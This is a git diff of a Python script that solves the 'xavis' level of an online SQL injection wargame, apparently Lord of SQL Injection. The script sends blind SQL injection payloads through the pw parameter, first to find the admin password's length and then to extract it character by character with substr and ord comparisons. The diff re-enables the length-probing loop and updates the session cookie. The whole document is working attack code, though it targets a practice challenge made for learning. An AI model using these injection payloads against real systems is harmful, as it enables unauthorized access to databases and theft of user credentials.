@@ -5,15 +5,15 @@ import codecs
 session = requests.Session()
 
 url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or (length(pw)={});%23"
-cookies = {"PHPSESSID": "t7lk6agpg5227q87cropdh21bo"}
-#for i in range(100):
-#    print(i,url.format(i))
-#    r=requests.get(url.format(i),cookies=cookies)
-#    if('Hello admin' in r.text[:200]):
-#        leng=i
-#        print("Length", i)
-#        break
-leng=3
+cookies = {"PHPSESSID": "di4uh3ta5r3vb6vhiu3hvfrkqt"}
+for i in range(100):
+   print(i,url.format(i))
+   r=requests.get(url.format(i),cookies=cookies)
+   if('Hello admin' in r.text[:200]):
+       leng=i
+       print("Length", i)
+       break
+
 url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or id='admin' and (substr(ord(substr(pw,{},1)),{},1)='{}');%23"
 w=""
 for i in range(1,leng+1):
